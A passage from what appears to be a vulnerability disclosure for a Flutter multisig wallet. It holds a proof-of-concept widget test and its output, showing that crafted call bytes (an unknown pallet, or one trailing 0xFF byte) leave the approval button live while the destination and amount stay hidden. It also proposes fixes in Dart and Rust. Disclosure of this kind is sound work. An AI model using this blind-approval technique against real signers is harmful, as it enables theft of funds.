  updatedAt: DateTime.now(),
  pallet: pallet,
  call: call,
  recipient: '',
  amount: BigInt.zero,
  expiryBlock: 1000,
  approvals: const [],
  deposit: BigInt.zero,
  status: MultisigProposalStatus.active,
  threshold: 2,
  signerCount: 3,
);

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    await SettingsService().initialize();
  });

  /// Signer 1 proposed, so signer 2 is the co-signer whose approval reaches
  /// threshold. That is the account the sheet acts for here.
  Future<void> pumpApproveSheet(WidgetTester tester, Uint8List chainBytes, MultisigProposal proposal) async {
    await tester.pumpWidget(
      ProviderScope(
        child: MediaQuery(
          data: const MediaQueryData(size: Size(800, 1200)),
          child: Builder(
            builder: (context) => MaterialApp(
              theme: AppTheme.darkTheme(context),
              home: Scaffold(
                body: MultisigActionConfirmSheet(
                  msig: makeMultisigAccount(),
                  proposal: proposal,
                  signer: makeAccount(2),
                  labels: MultisigConfirmSheetLabels(
                    title: (l) => l.multisigApproveConfirmTitle,
                    body: (l) => l.multisigApproveConfirmBody,
                    confirmLabel: (l) => l.multisigApproveConfirmYes,
                    dismissLabel: (l) => l.multisigApproveConfirmNo,
                    authReason: (l) => l.multisigApproveAuthReason,
                    failedMessage: (l) => l.multisigApproveFailed,
                  ),
                  // The loader SUCCEEDS: these are the authoritative chain bytes.
                  loadCallBytes: (_) async => chainBytes,
                  estimateFee: (_, _, _) async => BigInt.from(1000000000),
                  buildCall: (_, _) => throw UnimplementedError(),
                  submit: (_, _, _, _) async {},
                  submitExternal:
                      (
                        _, {
                        required signer,
                        required unsignedData,
                        required signature,
                        required publicKey,
                        fee,
                      }) async => '',
                  logPrefix: '[PoC]',
                  hardwareTelemetryPrefix: 'poc',
                  hardwareCacheIdentity: 'poc',
                ),
              ),
            ),
          ),
        ),
      ),
    );
    await tester.pumpAndSettle();
  }

  List<String> renderedText(WidgetTester tester) => tester
      .widgetList<Text>(find.byType(Text))
      .map((t) => t.data ?? '')
      .where((s) => s.isNotEmpty)
      .toList();

  void reportSheet(WidgetTester tester, String label) {
    final confirm = tester.widgetList<QuantusButton>(find.byType(QuantusButton)).first;
    final rendered = renderedText(tester);
    print('$label');
    print('  text on screen  : $rendered');
    print('  confirm button  : isDisabled=${confirm.isDisabled}, onTap=${confirm.onTap != null ? "wired" : "null"}');
    expect(confirm.isDisabled, isFalse, reason: 'the confirm button is live over bytes the sheet could not read');
    expect(confirm.onTap, isNotNull, reason: 'the production _confirm callback is wired');
    expect(
      rendered.any((s) => s.toLowerCase().contains(hex.encode(attackerId).substring(0, 8))),
      isFalse,
      reason: 'the destination is never shown',
    );
    expect(
      rendered.any((s) => s.contains('1000000') || s.contains('1,000,000') || s.contains('500000') || s.contains('500,000')),
      isFalse,
      reason: 'the amount is never shown',
    );
  }

  testWidgets('A: a pallet the bindings lack, indexer names it', (tester) async {
    final chainBytes = vestingCreateSchedule();
    expect(() => CallDecoder.decodeBytes(chainBytes), throwsA(anything));
    print('chain bytes       : 0x${hex.encode(chainBytes)}');

    await pumpApproveSheet(tester, chainBytes, indexedProposal(pallet: 'Vesting', call: 'create_schedule'));
    reportSheet(tester, 'A: Vesting.create_schedule -> 0xa7..a7, 1 000 000 QUAN');
  });

  testWidgets('A2: same call, an indexer that could not read it either', (tester) async {
    await pumpApproveSheet(tester, vestingCreateSchedule(), indexedProposal(pallet: '', call: ''));
    reportSheet(tester, 'A2: same call, empty indexer row');
    expect(renderedText(tester).any((s) => s.toLowerCase().contains('vesting')), isFalse, reason: 'nothing names the call');
  });

  testWidgets('B: one trailing byte on a call the bindings do carry', (tester) async {
    final chainBytes = transferWithTrailingByte();

    // The same bytes the runtime test proposes, approves and executes.
    expect(hex.encode(chainBytes), '020000${'a7' * 32}130000b2d3595bf006ff');

    // Without the trailing byte the sheet would render destination and amount.
    final clean = Uint8List.fromList(chainBytes.sublist(0, chainBytes.length - 1));
    final cleanDecoded = CallDecoder.decodeBytes(clean);
    print('clean call decodes: ${cleanDecoded.pallet}.${cleanDecoded.call}, summary=${cleanDecoded.summary != null}');

    expect(() => CallDecoder.decodeBytes(chainBytes), throwsA(isA<FormatException>()));
    print('chain bytes       : 0x${hex.encode(chainBytes)}  (${chainBytes.length} bytes, call is ${clean.length})');

    await pumpApproveSheet(tester, chainBytes, indexedProposal(pallet: 'Balances', call: 'transfer_allow_death'));
    reportSheet(tester, 'B: Balances.transfer_allow_death -> 0xa7..a7, 500 000 QUAN, plus one 0xFF');
  });


  testWidgets('B2: trailing byte on a batch, which no indexer summarises as a transfer', (tester) async {
    final chainBytes = batchTransferWithTrailingByte();
    expect(hex.encode(chainBytes), '090004020000${'a7' * 32}130000d9e9ac2d7803ff');

    final clean = Uint8List.fromList(chainBytes.sublist(0, chainBytes.length - 1));
    final cleanDecoded = CallDecoder.decodeBytes(clean);
    print('clean call decodes: ${cleanDecoded.pallet}.${cleanDecoded.call}, ${cleanDecoded.fields.length} field(s)');

    expect(() => CallDecoder.decodeBytes(chainBytes), throwsA(isA<FormatException>()));

    await pumpApproveSheet(tester, chainBytes, indexedProposal(pallet: 'Utility', call: 'batch'));
    reportSheet(tester, 'B2: Utility.batch([Balances.transfer_allow_death -> 0xa7..a7, 250 000 QUAN]) plus one 0xFF');
    expect(
      renderedText(tester).any((s) => s.contains('250000') || s.contains('250,000')),
      isFalse,
      reason: 'the nested amount is never shown',
    );
  });
}
```

{% endstep %}

{% step %}

## Run the test

```bash
flutter test test/unit/multisig_blind_approval_poc_test.dart
```

Output:

```
00:00 +0: A: a pallet the bindings lack, indexer names it
chain bytes       : 0x1601a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7e803000000000000d007000000000000b80b000000000000000064a7b3b6e00d0000000000000000
[PoC] could not decode stored proposal call: Exception: RuntimeCall: Invalid variant index: "22"
A: Vesting.create_schedule -> 0xa7..a7, 1 000 000 QUAN
  text on screen  : [Are you sure?, You are about to approve a transfer of, Create schedule, Vesting, NETWORK FEE, 0.001 QUAN, Yes, Approve, No, Go Back]
  confirm button  : isDisabled=false, onTap=wired
00:00 +1: A2: same call, an indexer that could not read it either
[PoC] could not decode stored proposal call: Exception: RuntimeCall: Invalid variant index: "22"
A2: same call, empty indexer row
  text on screen  : [Are you sure?, You are about to approve a transfer of, NETWORK FEE, 0.001 QUAN, Yes, Approve, No, Go Back]
  confirm button  : isDisabled=false, onTap=wired
00:00 +2: B: one trailing byte on a call the bindings do carry
clean call decodes: Balances.transfer_allow_death, summary=true
chain bytes       : 0x020000a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7130000b2d3595bf006ff  (45 bytes, call is 44)
[PoC] could not decode stored proposal call: FormatException: 1 trailing bytes after nested call
B: Balances.transfer_allow_death -> 0xa7..a7, 500 000 QUAN, plus one 0xFF
  text on screen  : [Are you sure?, You are about to approve a transfer of, Transfer allow death, Balances, NETWORK FEE, 0.001 QUAN, Yes, Approve, No, Go Back]
  confirm button  : isDisabled=false, onTap=wired
00:00 +3: B2: trailing byte on a batch, which no indexer summarises as a transfer
clean call decodes: Utility.batch, 2 field(s)
[PoC] could not decode stored proposal call: FormatException: 1 trailing bytes after nested call
B2: Utility.batch([Balances.transfer_allow_death -> 0xa7..a7, 250 000 QUAN]) plus one 0xFF
  text on screen  : [Are you sure?, You are about to approve a transfer of, Batch, Utility, NETWORK FEE, 0.001 QUAN, Yes, Approve, No, Go Back]
  confirm button  : isDisabled=false, onTap=wired
00:00 +4: All tests passed!
```

{% endstep %}
{% endstepper %}

`[PoC] could not decode stored proposal call` is the shipped `quantusPrint` at `multisig_action_confirm_sheet.dart:191`. That log line is the whole consequence of the decode failure: the sheet finishes building and the button stays wired to `_confirm`.

Cases B and B2 are the ones to read first. Each prints what the same bytes decode to with the last byte removed: a `Balances.transfer_allow_death` carrying a summary, and a two-field `Utility.batch`. Both are calls the bundled bindings handle correctly. One 0xFF is the difference between a transfer the signer can inspect and two words they cannot.

## Suggested fix

Decode during `_prepare`, where the state can be set safely, and fail closed on a decode failure exactly as the screen already fails closed on a load failure. Setting state from inside a getter that `build` calls would risk a `setState` during build.

```dart
// in _prepare, after the loader returns
try {
  _decodedCall = CallDecoder.decodeBytes(bytes);
} catch (e) {
  quantusPrint('${widget.logPrefix} could not decode stored proposal call: $e');
  _callBytesFailed = true;   // same gate as a load failure
}
```

Two changes belong with it. Once `_callBytes` has loaded, drop the indexer fallback, so a description shown next to a signature always derives from the bytes being signed. And refuse to sign when the chain's `spec_version` is not one the bundled codec was generated against, which closes trigger A for every future runtime upgrade rather than leaving it to reappear with the next new pallet.

Trigger B is worth fixing on the chain as well. `Multisig::propose` can reject a call with bytes left over, the way the wallet's decoder already does, so a proposal's stored bytes are always exactly the call it dispatches:

```rust
let mut input = &call[..];
let decoded_call = <T as Config>::RuntimeCall::decode(&mut input)
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
if !input.is_empty() {
    return Self::err_burn_full(Error::<T>::InvalidCall);
}
```

The behaviour to copy on the app side is already in the SDK. `QuantusPayloadParser.parsePayload` throws a `FormatException` when the call does not decode, when bytes trail the payload, when the metadata-hash mode is inconsistent, and when the genesis hash is unknown (`quantus_sdk/lib/src/quantus_payload_parser.dart:130`, `:137`, `:142`, `:159`).
